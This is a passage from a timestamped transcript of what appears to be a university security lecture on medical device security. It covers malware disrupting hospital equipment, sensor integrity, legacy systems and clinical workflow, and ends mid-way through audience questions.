very, very tricky</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:43</time_slice>
              <text_slice>to share these kinds of
problems with the people who</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:46</time_slice>
              <text_slice>are most able to fix it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:48</time_slice>
              <text_slice>So it often results
in in-person meetings</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:51</time_slice>
              <text_slice>and actually going
to their facilities.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:55</time_slice>
              <text_slice>So I want to save
some more time here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:58</time_slice>
              <text_slice>Hopefully we'll
have some questions,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:59</time_slice>
              <text_slice>because I think we have
five or 10 minutes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:02</time_slice>
              <text_slice>But I want to dispel
a couple of myths.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:07</time_slice>
              <text_slice>You'll hear a lot of newspaper
headlines and TV shows</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:10</time_slice>
              <text_slice>talking about hackers
breaking into medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:14</time_slice>
              <text_slice>Let me say it is a problem,
but it's not the problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:18</time_slice>
              <text_slice>It's not the only
problem, and it's probably</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:19</time_slice>
              <text_slice>not the most
significant problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:22</time_slice>
              <text_slice>And it's hard to say
that, especially when you</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:24</time_slice>
              <text_slice>enjoy doing security analysis.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:25</time_slice>
              <text_slice>It's hard to say that,
because there's actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:27</time_slice>
              <text_slice>two problems that I
think are more important.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:29</time_slice>
              <text_slice>One is preventing wide-scale
unavailability of patient care.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:34</time_slice>
              <text_slice>Because forget adversaries--
what if you just</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:36</time_slice>
              <text_slice>have malware that
accidentally breaks</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:37</time_slice>
              <text_slice>into a medical device
in a monoculture</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:40</time_slice>
              <text_slice>where they're all running
the same operating system?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:42</time_slice>
              <text_slice>What happens when you
lose 50,000 infusion</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:44</time_slice>
              <text_slice>pumps all at once?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:46</time_slice>
              <text_slice>It's very difficult to
deliver patient care.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:49</time_slice>
              <text_slice>One of my colleagues wrote to me
saying that his cath labs were</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:55</time_slice>
              <text_slice>shut down.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:55</time_slice>
              <text_slice>Catheterization lab is a
relatively new specialization.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:58</time_slice>
              <text_slice>It's a special kind
of operating room</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:00</time_slice>
              <text_slice>for minimally invasive surgery.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:02</time_slice>
              <text_slice>And at his hospital,
they had to shut down</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:05</time_slice>
              <text_slice>the cath lab, because
turned out a nurse</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:08</time_slice>
              <text_slice>had accidentally
brought in a USB stick.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:10</time_slice>
              <text_slice>Something about transferring
family photos up to Yahoo.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:12</time_slice>
              <text_slice>And somehow malware
had gotten in</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:14</time_slice>
              <text_slice>and infected their cath labs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:17</time_slice>
              <text_slice>So they had to shut
the thing down.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:20</time_slice>
              <text_slice>So if you're waiting
to get an angioplasty,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:22</time_slice>
              <text_slice>that particular center's
not available to you.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:24</time_slice>
              <text_slice>You'll have to use one
of the backup centers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:26</time_slice>
              <text_slice>So availability is, I think, one
of the key things that is often</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:29</time_slice>
              <text_slice>forgotten about in security.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:32</time_slice>
              <text_slice>Second one is the
integrity of the sensor.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:35</time_slice>
              <text_slice>So if your medical
device gets infected</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:38</time_slice>
              <text_slice>by malware, or any kind
of malicious software,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:43</time_slice>
              <text_slice>things are going to change.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:44</time_slice>
              <text_slice>Things are going
to change in a way</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:45</time_slice>
              <text_slice>that the designers
didn't anticipate.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:47</time_slice>
              <text_slice>So a very simple example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:50</time_slice>
              <text_slice>Let's say some malware
gets in, and adds a timer</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:53</time_slice>
              <text_slice>to every now and then wake
up, send some network packets,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:58</time_slice>
              <text_slice>and send out some spam.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:00</time_slice>
              <text_slice>This took some time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:01</time_slice>
              <text_slice>Well, what happens if your
medical device assumed</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:04</time_slice>
              <text_slice>that it had complete control
over the interrupt handler,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:07</time_slice>
              <text_slice>and suddenly now it's
missing interrupts?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:09</time_slice>
              <text_slice>Maybe the sensor has
some data to supply</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:12</time_slice>
              <text_slice>to the medical device, but
because of the malware,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:14</time_slice>
              <text_slice>it missed the interrupt.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:16</time_slice>
              <text_slice>You may actually start
misdiagnosing patients now,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:19</time_slice>
              <text_slice>because that device is going
to be getting bad data.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:22</time_slice>
              <text_slice>So I'm very concerned
about the integrity</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:24</time_slice>
              <text_slice>of the medical sensors.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:25</time_slice>
              <text_slice>There was actually a reported
case of a high-risk pregnancy</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:29</time_slice>
              <text_slice>monitor getting
infected with malware</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:30</time_slice>
              <text_slice>and giving out
incorrect readings.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:33</time_slice>
              <text_slice>The good news is a
highly-trained clinician</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:36</time_slice>
              <text_slice>can look at the device and
say, that makes no sense.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:40</time_slice>
              <text_slice>That's not a sane number coming
out of my medical device.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:44</time_slice>
              <text_slice>But we're basically cutting
down the safety margins</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:47</time_slice>
              <text_slice>when we can't have the integrity
of our medical sensors.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:52</time_slice>
              <text_slice>As I mentioned, very
difficult to bolt on this</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:54</time_slice>
              <text_slice>stuff after the fact.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:57</time_slice>
              <text_slice>You think changing software's
hard on an internet scale?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:00</time_slice>
              <text_slice>Try it on a medical device.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:01</time_slice>
              <text_slice>So I met a guy from one
hospital where his MRI is still</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:06</time_slice>
              <text_slice>running on Windows 95.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:08</time_slice>
              <text_slice>I have a pacemaker
programmer that runs on OS/2.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:14</time_slice>
              <text_slice>And they recently
upgraded to Windows XP.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:17</time_slice>
              <text_slice>So they have some really old
stuff out there, so changing</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:21</time_slice>
              <text_slice>things for security after the
fact is going to be difficult.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>Not impossible, but difficult.
And the other reason</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:28</time_slice>
              <text_slice>is the interruption
of clinical workflow.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:31</time_slice>
              <text_slice>If you ever go off
and want to start</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:32</time_slice>
              <text_slice>implementing medical
devices or doing something</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:35</time_slice>
              <text_slice>security related
for health care,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:36</time_slice>
              <text_slice>I encourage you to go off
and call up some people,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:39</time_slice>
              <text_slice>and say, hey, can I go
into your operating room?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:41</time_slice>
              <text_slice>That's what we did.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:43</time_slice>
              <text_slice>Because you'll see some
weird things happen.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:45</time_slice>
              <text_slice>I took all my students to live
surgery, pediatric surgery.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:49</time_slice>
              <text_slice>And as they were
watching the surgery,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:52</time_slice>
              <text_slice>they were watching one
clinician checking Gmail</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:55</time_slice>
              <text_slice>on one of the medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:57</time_slice>
              <text_slice>And they're like, oh OK, so,
drive-by downloads, check.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:01</time_slice>
              <text_slice>At the same time, they
wanted to calm the patient,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:04</time_slice>
              <text_slice>so they logged into
Pandora to play music.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:10</time_slice>
              <text_slice>Actually I was just at
my dentist the other day,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:12</time_slice>
              <text_slice>and she was playing Pandora.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:13</time_slice>
              <text_slice>And these ads for various beers
started coming up on the screen</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:18</time_slice>
              <text_slice>as she was looking
at my dental x-rays.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:19</time_slice>
              <text_slice>And I was trying to figure
why Dos Equis was on my-- I</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:22</time_slice>
              <text_slice>was like, did I drink that much?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:26</time_slice>
              <text_slice>She's like, no, we
just play Pandora here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:27</time_slice>
              <text_slice>It's the same web browser,
and just click here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:31</time_slice>
              <text_slice>So there's a lot
of mixing going on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:34</time_slice>
              <text_slice>Maybe it's not malicious,
but it's opening cracks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:37</time_slice>
              <text_slice>It's out of sight, out of mind.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:39</time_slice>
              <text_slice>The hand washing
sterile technique</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:41</time_slice>
              <text_slice>is driven into the mindset
of anyone who's a clinician.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:44</time_slice>
              <text_slice>Wash your hands.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:45</time_slice>
              <text_slice>Don't touch the gloves
after you put them on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:47</time_slice>
              <text_slice>But when it comes
to security hygiene,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:49</time_slice>
              <text_slice>it's really out of
sight, out of mind.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:51</time_slice>
              <text_slice>It's not part of
the culture yet.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:52</time_slice>
              <text_slice>They don't even
realize they should</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:54</time_slice>
              <text_slice>be asking these questions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:55</time_slice>
              <text_slice>Should I be running Pandora
on the same device that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:57</time_slice>
              <text_slice>controlling my x-rays?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:00</time_slice>
              <text_slice>So but the important thing
is on the designer side</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:02</time_slice>
              <text_slice>is not to interrupt
the clinical workflow.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:04</time_slice>
              <text_slice>Because that's when
mistakes happen.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:05</time_slice>
              <text_slice>You want to keep the
clinical workflow</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:07</time_slice>
              <text_slice>regular, predictable, easy
for them to make decisions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:11</time_slice>
              <text_slice>And if you add a new dialogue
box to enter a password, what</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:16</time_slice>
              <text_slice>do you think a problem could
be in the operating room</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:18</time_slice>
              <text_slice>if you ask the clinician
to enter a password, say,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:20</time_slice>
              <text_slice>every ten minutes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:28</time_slice>
              <text_slice>Distractions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:29</time_slice>
              <text_slice>You're sitting there,
doing this, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:31</time_slice>
              <text_slice>Scalpel.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:32</time_slice>
              <text_slice>Oh, yeah, let me walk
over here and type in my</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:34</time_slice>
              <text_slice>pass-- oh, no, I
got my gloves on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:36</time_slice>
              <text_slice>Let me take those off.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:37</time_slice>
              <text_slice>Oh, I've got to resterilize now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:39</time_slice>
              <text_slice>Nurse!</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:40</time_slice>
              <text_slice>So if you're a
security engineer,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:43</time_slice>
              <text_slice>you have to take into
account all the rather</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:45</time_slice>
              <text_slice>special conditions of the
clinical setting with infection</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:48</time_slice>
              <text_slice>control.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:49</time_slice>
              <text_slice>Which, surprisingly, not
everybody knows about.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:51</time_slice>
              <text_slice>There are definitely some
very talented engineers who</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:53</time_slice>
              <text_slice>know about it, but not enough.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:57</time_slice>
              <text_slice>The other big problem
is I've noticed</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:59</time_slice>
              <text_slice>that security people tend to
specialize in the mechanisms</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:06</time_slice>
              <text_slice>to control security.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:08</time_slice>
              <text_slice>You can wield crypto.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:09</time_slice>
              <text_slice>I know CBC mode this, and I
know public key crypto this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:12</time_slice>
              <text_slice>That's great.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:14</time_slice>
              <text_slice>And you know how to
prevent the problems.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:16</time_slice>
              <text_slice>You know how to
detect the problems.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:18</time_slice>
              <text_slice>The issue is from
the medical world.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:20</time_slice>
              <text_slice>Most people in the
medical world are</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:21</time_slice>
              <text_slice>coming from a very
different mindset, one</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:23</time_slice>
              <text_slice>that's called risk management.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:25</time_slice>
              <text_slice>Let me try to explain it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:27</time_slice>
              <text_slice>In risk management, you
look at risks and benefits,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:29</time_slice>
              <text_slice>and you ask yourself,
do they balance?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:31</time_slice>
              <text_slice>If I take an action, does that
improve my risk management</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:35</time_slice>
              <text_slice>outlook?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:36</time_slice>
              <text_slice>So if you're going to
decide, for instance,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:38</time_slice>
              <text_slice>am I going to deploy
a password system</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:41</time_slice>
              <text_slice>on all my medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:43</time_slice>
              <text_slice>A security person
might say, duh,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:46</time_slice>
              <text_slice>of course you're going
to deploy passwords,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:48</time_slice>
              <text_slice>because you need
to authenticate.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:49</time_slice>
              <text_slice>The safety person might
say, well, wait a minute.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:52</time_slice>
              <text_slice>If I required we have
passwords on every system,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:56</time_slice>
              <text_slice>we're going to worry
about sterilization.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:58</time_slice>
              <text_slice>How do we know how
often to time out?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:00</time_slice>
              <text_slice>And what about emergency access?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:02</time_slice>
              <text_slice>What if we forget the password?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:04</time_slice>
              <text_slice>We want to make sure we can get
a response time in 30 seconds.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:07</time_slice>
              <text_slice>So they might actually
make a different decision.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:09</time_slice>
              <text_slice>They might actually decide
not to have passwords at all.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:12</time_slice>
              <text_slice>Actually many hospitals
don't have passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:14</time_slice>
              <text_slice>Excuse me, many hospitals
don't have access control</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>on medical records.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:19</time_slice>
              <text_slice>Instead they have what's called
audit-based access control.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>After the fact, if you look
at something you shouldn't</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:23</time_slice>
              <text_slice>look at, they come get you.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:25</time_slice>
              <text_slice>Because they know that it's
very difficult to predict what</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:28</time_slice>
              <text_slice>you're going to
need in your routine</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:30</time_slice>
              <text_slice>of your clinical workflow.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:32</time_slice>
              <text_slice>So the risk
management kind of way</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:35</time_slice>
              <text_slice>will depend upon deploying
the security controls</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:39</time_slice>
              <text_slice>and all the technology
learn about.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:40</time_slice>
              <text_slice>But in the risk
management picture,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:42</time_slice>
              <text_slice>you might actually decide
not to deploy something,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:44</time_slice>
              <text_slice>because it could cause
harm somewhere else.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:48</time_slice>
              <text_slice>But trustworthy
medical device software</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:49</time_slice>
              <text_slice>is going to require both.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:52</time_slice>
              <text_slice>So I'll just finish up here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:54</time_slice>
              <text_slice>I think there's a lot of
interesting things to do.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:56</time_slice>
              <text_slice>So you're taking this
cool security course.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:59</time_slice>
              <text_slice>I encourage you to go
out and use those tools.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:01</time_slice>
              <text_slice>But as you're thinking about
where to go afterwards,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:03</time_slice>
              <text_slice>whether it's industry
or graduate school,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:05</time_slice>
              <text_slice>think about medical devices,
because they need your help.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:07</time_slice>
              <text_slice>They need a lot of
smart people there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:09</time_slice>
              <text_slice>And so there's just one
thing missing-- you are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:12</time_slice>
              <text_slice>And I think there's a
lot of interesting stuff</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:14</time_slice>
              <text_slice>still to be done.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:15</time_slice>
              <text_slice>So I think we have five
or 10 minutes or so.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:17</time_slice>
              <text_slice>I'd be glad to take
some questions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:19</time_slice>
              <text_slice>Or I could go more into depth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:20</time_slice>
              <text_slice>I got some fun
videos I could show.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:22</time_slice>
              <text_slice>But I think I'll at least
take a break for a moment</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:25</time_slice>
              <text_slice>to see if you have
any questions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:28</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:29</time_slice>
              <text_slice>AUDIENCE: So that
pacemaker or whatever</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:31</time_slice>
              <text_slice>it was that you were passing
around, does that [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:35</time_slice>
              <text_slice>PROFESSOR: Oh,
the defibrillator.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:36</time_slice>
              <text_slice>AUDIENCE: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:37</time_slice>
              <text_slice>How does that
interact with the fact</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:41</time_slice>
              <text_slice>that they are [INAUDIBLE]
these kind of things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:44</time_slice>
              <text_slice>PROFESSOR: OK so
a couple things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:46</time_slice>
              <text_slice>So there are defibrillators
and there are pacemakers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:48</time_slice>
              <text_slice>They're very related.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:50</time_slice>
              <text_slice>This is a defibrillator.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:51</time_slice>
              <text_slice>It sends out large shocks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:53</time_slice>
              <text_slice>Pacemakers send
out small shocks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:55</time_slice>
              <text_slice>But in the US, it's
illegal to reimplant these.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:59</time_slice>
              <text_slice>So it doesn't matter if you can.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:01</time_slice>
              <text_slice>It's just illegal.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:02</time_slice>
              <text_slice>But in many developing
countries it's not illegal.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:05</time_slice>
              <text_slice>And if you look from--
let me back up a slide.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:10</time_slice>
              <text_slice>If you look from not the
control mechanism, but the risk</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:14</time_slice>
              <text_slice>management side of
equation, it might actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:16</time_slice>
              <text_slice>lead to better public
health outcomes</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:19</time_slice>
              <text_slice>to allow reimplantation and
reuse in developing countries</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:22</time_slice>
              <text_slice>where they have no other choice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:25</time_slice>
              <text_slice>And this is not my project.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:26</time_slice>
              <text_slice>This is just a project
we're assisting on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:29</time_slice>
              <text_slice>But in that particular case, the
patients really have no choice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:32</time_slice>
              <text_slice>It's basically a death sentence.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:34</time_slice>
              <text_slice>To sterilize it
is pretty tricky.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:36</time_slice>
              <text_slice>There's a whole lot of
science and engineering</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:38</time_slice>
              <text_slice>that goes into how
to properly sterilize</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:40</time_slice>
              <text_slice>to get rid of the pathogens.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:44</time_slice>
              <text_slice>Because these were in blood,
so first abrasive cleaner,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:48</time_slice>
              <text_slice>but the ethylene
oxide is one way</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:50</time_slice>
              <text_slice>to destroy most, if not
all, of the pathogens.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:52</time_slice>
              <text_slice>There's a whole
testing procedure.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:54</time_slice>
              <text_slice>You actually put
special little-- I</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:58</time_slice>
              <text_slice>forgot what they're called.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:59</time_slice>
              <text_slice>They're little wafers-- with
known quantities of pathogens.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:02</time_slice>
              <text_slice>And you put it in alongside
some of the devices</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:05</time_slice>
              <text_slice>as it's going into the chamber,
and when you pull it out,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:08</time_slice>
              <text_slice>you test to see if all those
organisms have been killed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:12</time_slice>
              <text_slice>Did that answer
all your questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:14</time_slice>
              <text_slice>You had a follow up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:16</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>AUDIENCE: So what you're
saying, integrity of sensors</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:20</time_slice>
              <text_slice>is a bigger risk
for hacker attack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:22</time_slice>
              <text_slice>because most of the examples of
sensory interference you showed</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:26</time_slice>
              <text_slice>are intentional interference.</text_slice>
            </slice>
